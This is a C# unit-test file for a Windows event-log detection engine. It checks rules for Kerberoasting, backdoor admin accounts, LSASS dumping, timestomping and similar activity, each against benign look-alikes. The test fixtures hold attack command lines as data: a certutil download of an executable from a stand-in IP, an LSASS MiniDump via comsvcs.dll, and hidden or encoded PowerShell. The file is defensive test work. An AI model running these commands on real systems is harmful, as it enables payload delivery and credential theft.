using System.Text.Json;
using Hawk.Core;
using Microsoft.Data.Sqlite;
using Xunit;

namespace Hawk.Core.Tests;

/// <summary>
/// Rule-level tests for EventScorer: each rule gets a positive case and the
/// benign look-alike it must NOT fire on (false-positive resistance is the
/// point of the design, so it is tested as hard as detection).
/// </summary>
public sealed class DetectionRuleTests : IDisposable
{
    private readonly string _dir = Path.Combine(Path.GetTempPath(), "hawk_ut_" + Guid.NewGuid().ToString("N")[..8]);
    private readonly SqliteConnection _db;

    public DetectionRuleTests()
    {
        Directory.CreateDirectory(_dir);
        _db = Db.Open(Path.Combine(_dir, "hawk.db"));
    }

    public void Dispose()
    {
        _db.Dispose();
        SqliteConnection.ClearAllPools();
        try { Directory.Delete(_dir, true); } catch { /* best effort */ }
    }

    private const string Sec = "Security";
    private const string Sysmon = "Microsoft-Windows-Sysmon/Operational";

    private void Event(string channel, int eventId, string ts, object data)
    {
        using var cmd = _db.CreateCommand();
        cmd.CommandText = "INSERT INTO event_logs (ts_utc, channel, event_id, summary, event_data) VALUES ($t, $c, $e, $s, $d)";
        cmd.Parameters.AddWithValue("$t", ts);
        cmd.Parameters.AddWithValue("$c", channel);
        cmd.Parameters.AddWithValue("$e", eventId);
        cmd.Parameters.AddWithValue("$s", $"EID {eventId}");
        cmd.Parameters.AddWithValue("$d", JsonSerializer.Serialize(data));
        cmd.ExecuteNonQuery();
    }

    private void Mft(string name, string path, string siCreated, string fnCreated)
    {
        using var cmd = _db.CreateCommand();
        cmd.CommandText = """
            INSERT INTO mft_entries (record_number, in_use, is_directory, file_name, full_path, si_created_utc, fn_created_utc)
            VALUES (1, 1, 0, $n, $p, $si, $fn)
            """;
        cmd.Parameters.AddWithValue("$n", name);
        cmd.Parameters.AddWithValue("$p", path);
        cmd.Parameters.AddWithValue("$si", siCreated);
        cmd.Parameters.AddWithValue("$fn", fnCreated);
        cmd.ExecuteNonQuery();
    }

    private List<(string Rule, string Severity, string? Technique)> Score()
    {
        EventScorer.Score(_db);
        var list = new List<(string, string, string?)>();
        using var cmd = _db.CreateCommand();
        cmd.CommandText = "SELECT rule, severity, technique FROM findings";
        using var r = cmd.ExecuteReader();
        while (r.Read()) list.Add((r.GetString(0), r.GetString(1), r.IsDBNull(2) ? null : r.GetString(2)));
        return list;
    }

    // ---- Kerberoasting ----------------------------------------------------------

    private void Tgs(string acct, string svc, string enc, string ts) =>
        Event(Sec, 4769, ts, new { TargetUserName = acct, ServiceName = svc, TicketEncryptionType = enc, Status = "0x0", IpAddress = "::ffff:10.0.0.5" });

    [Fact]
    public void Kerberoasting_RC4_sweep_of_3_spns_fires()
    {
        Tgs("jdoe@CORP", "svc_sql", "0x17", "2026-06-01T10:00:00Z");
        Tgs("jdoe@CORP", "svc_web", "0x17", "2026-06-01T10:01:00Z");
        Tgs("jdoe@CORP", "svc_backup", "0x17", "2026-06-01T10:02:00Z");
        var f = Score();
        Assert.Contains(f, x => x.Rule == "kerberoasting-rc4-spn-sweep" && x.Severity == "high");
    }

    [Fact]
    public void Kerberoasting_ignores_AES_machine_accounts_and_slow_requests()
    {
        Tgs("jdoe@CORP", "svc_sql", "0x12", "2026-06-01T10:00:00Z");      // AES
        Tgs("jdoe@CORP", "svc_web", "0x12", "2026-06-01T10:01:00Z");
        Tgs("jdoe@CORP", "svc_bak", "0x12", "2026-06-01T10:02:00Z");
        Tgs("ws01$@CORP", "FS01$", "0x17", "2026-06-01T10:00:00Z");       // machine-account services
        Tgs("ws01$@CORP", "FS02$", "0x17", "2026-06-01T10:00:10Z");
        Tgs("ws01$@CORP", "FS03$", "0x17", "2026-06-01T10:00:20Z");
        Tgs("asmith@CORP", "svc_a", "0x17", "2026-06-01T08:00:00Z");      // RC4 but hours apart
        Tgs("asmith@CORP", "svc_b", "0x17", "2026-06-01T10:00:00Z");
        Tgs("asmith@CORP", "svc_c", "0x17", "2026-06-01T12:00:00Z");
        Assert.DoesNotContain(Score(), x => x.Rule.StartsWith("kerberoasting"));
    }

    // ---- account manipulation -----------------------------------------------------

    [Fact]
    public void New_account_added_to_admins_converges_to_critical()
    {
        Event(Sec, 4720, "2026-06-01T10:00:00Z", new { TargetUserName = "backdoor", TargetDomainName = "WS01", TargetSid = "S-1-5-21-1-2-3-1009", SubjectUserName = "jdoe", SubjectDomainName = "WS01" });
        Event(Sec, 4732, "2026-06-01T10:05:00Z", new { TargetUserName = "Administrators", MemberName = "-", MemberSid = "S-1-5-21-1-2-3-1009", SubjectUserName = "jdoe", SubjectDomainName = "WS01" });
        var f = Score();
        Assert.Contains(f, x => x.Rule == "new-account-added-to-privileged-group" && x.Severity == "critical");
        Assert.DoesNotContain(f, x => x.Rule == "local-account-created");      // folded into the converged finding
    }

    [Fact]
    public void Non_privileged_group_add_does_not_fire_but_creation_alone_is_medium()
    {
        Event(Sec, 4720, "2026-06-01T10:00:00Z", new { TargetUserName = "newhire", TargetSid = "S-1-5-21-1-2-3-1010", SubjectUserName = "helpdesk" });
        Event(Sec, 4732, "2026-06-01T10:05:00Z", new { TargetUserName = "Users", MemberSid = "S-1-5-21-1-2-3-1010", SubjectUserName = "helpdesk" });
        var f = Score();
        Assert.DoesNotContain(f, x => x.Rule.Contains("privileged-group"));
        Assert.Contains(f, x => x.Rule == "local-account-created" && x.Severity == "medium");
    }

    // ---- audit policy -----------------------------------------------------------------

    [Fact]
    public void Audit_removal_by_user_fires_but_not_by_system_gpo_refresh()
    {
        Event(Sec, 4719, "2026-06-01T10:00:00Z", new { SubjectUserSid = "S-1-5-21-1-2-3-500", SubjectUserName = "admin", AuditPolicyChanges = "%%8448, %%8450" });
        Event(Sec, 4719, "2026-06-01T11:00:00Z", new { SubjectUserSid = "S-1-5-18", SubjectUserName = "WS01$", AuditPolicyChanges = "%%8448" });
        Event(Sec, 4719, "2026-06-01T12:00:00Z", new { SubjectUserSid = "S-1-5-21-1-2-3-500", SubjectUserName = "admin", AuditPolicyChanges = "%%8449" });  // success ADDED
        Assert.Single(Score(), x => x.Rule == "audit-policy-weakened");
    }

    // ---- process creation -----------------------------------------------------------------

    [Fact]
    public void Process_creation_rules_fire_on_attack_patterns()
    {
        Event(Sec, 4688, "2026-06-01T10:00:00Z", new { ParentProcessName = @"C:\Windows\System32\inetsrv\w3wp.exe", NewProcessName = @"C:\Windows\System32\cmd.exe", CommandLine = "cmd /c whoami" });
        Event(Sysmon, 1, "2026-06-01T10:01:00Z", new { ParentImage = @"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", Image = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", CommandLine = "powershell -w hidden" });
        Event(Sec, 4688, "2026-06-01T10:02:00Z", new { ParentProcessName = @"C:\Windows\System32\cmd.exe", NewProcessName = @"C:\Windows\System32\rundll32.exe", CommandLine = @"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\temp\l.dmp full" });
        Event(Sec, 4688, "2026-06-01T10:03:00Z", new { ParentProcessName = @"C:\Windows\System32\cmd.exe", NewProcessName = @"C:\Windows\System32\certutil.exe", CommandLine = "certutil -urlcache -split -f http://203.0.113.9/a.exe a.exe" });
        var f = Score();
        Assert.Contains(f, x => x.Rule == "webserver-spawned-shell" && x.Severity == "critical");
        Assert.Contains(f, x => x.Rule == "office-spawned-shell-history" && x.Severity == "high");
        Assert.Contains(f, x => x.Rule == "lsass-dump-commandline" && x.Severity == "critical");
        Assert.Contains(f, x => x.Rule == "lolbin-download-execute" && x.Severity == "high");
    }

    [Fact]
    public void Process_creation_ignores_routine_shells_and_certutil_hashing()
    {
        Event(Sec, 4688, "2026-06-01T10:00:00Z", new { ParentProcessName = @"C:\Windows\explorer.exe", NewProcessName = @"C:\Windows\System32\cmd.exe", CommandLine = "cmd.exe" });
        Event(Sec, 4688, "2026-06-01T10:01:00Z", new { ParentProcessName = @"C:\Windows\System32\cmd.exe", NewProcessName = @"C:\Windows\System32\certutil.exe", CommandLine = "certutil -hashfile setup.exe SHA256" });
        Assert.Empty(Score());
    }

    // ---- LSASS access ---------------------------------------------------------------------

    [Fact]
    public void Lsass_memory_read_by_unknown_tool_fires_but_not_defender_or_query_only()
    {
        Event(Sysmon, 10, "2026-06-01T10:00:00Z", new { SourceImage = @"C:\Users\Public\x.exe", TargetImage = @"C:\Windows\system32\lsass.exe", GrantedAccess = "0x1010", CallTrace = "ntdll.dll+9d4c4" });
        Event(Sysmon, 10, "2026-06-01T10:01:00Z", new { SourceImage = @"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1\MsMpEng.exe", TargetImage = @"C:\Windows\system32\lsass.exe", GrantedAccess = "0x1fffff" });
        Event(Sysmon, 10, "2026-06-01T10:02:00Z", new { SourceImage = @"C:\Tools\procexp64.exe", TargetImage = @"C:\Windows\system32\lsass.exe", GrantedAccess = "0x1000" });  // QUERY_LIMITED only
        Assert.Single(Score(), x => x.Rule == "lsass-memory-access");
    }

    // ---- $MFT timestomping ----------------------------------------------------------------

    [Fact]
    public void Timestomp_flags_backdated_executable_in_user_writable_path_only()
    {
        Mft("upd.exe", @"C:\Users\jdoe\AppData\Roaming\upd.exe", "2019-03-01T00:00:00Z", "2026-06-01T10:00:00Z");
        Mft("notepad.exe", @"C:\Windows\System32\notepad.exe", "2019-03-01T00:00:00Z", "2026-06-01T10:00:00Z");   // not user-writable
        Mft("notes.txt", @"C:\Users\jdoe\AppData\Roaming\notes.txt", "2019-03-01T00:00:00Z", "2026-06-01T10:00:00Z"); // not executable
        Mft("ok.exe", @"C:\Users\jdoe\Downloads\ok.exe", "2026-06-01T09:30:00Z", "2026-06-01T10:00:00Z");           // < 1h skew
        Assert.Single(Score(), x => x.Rule == "mft-timestomp-suspected");
    }

    // ---- ATT&CK tagging ---------------------------------------------------------------------

    [Fact]
    public void Every_finding_is_tagged_with_an_attack_technique()
    {
        // includes rules whose names previously did not match the ATT&CK map
        Event(Sec, 1102, "2026-06-01T10:00:00Z", new { SubjectUserName = "admin" });
        Event("Microsoft-Windows-Windows Defender/Operational", 5001, "2026-06-01T10:01:00Z", new { });
        Event(Sec, 4698, "2026-06-01T10:02:00Z", new { TaskName = @"\upd", TaskContent = "powershell -enc AAAA" });
        Event(Sec, 4688, "2026-06-01T10:03:00Z", new { ParentProcessName = @"C:\x\w3wp.exe", NewProcessName = @"C:\Windows\System32\cmd.exe", CommandLine = "cmd /c whoami" });
        var f = Score();
        Assert.True(f.Count >= 4, $"expected >= 4 findings, got {f.Count}");
        Assert.All(f, x => Assert.False(string.IsNullOrEmpty(x.Technique), $"rule '{x.Rule}' has no ATT&CK technique"));
    }
}
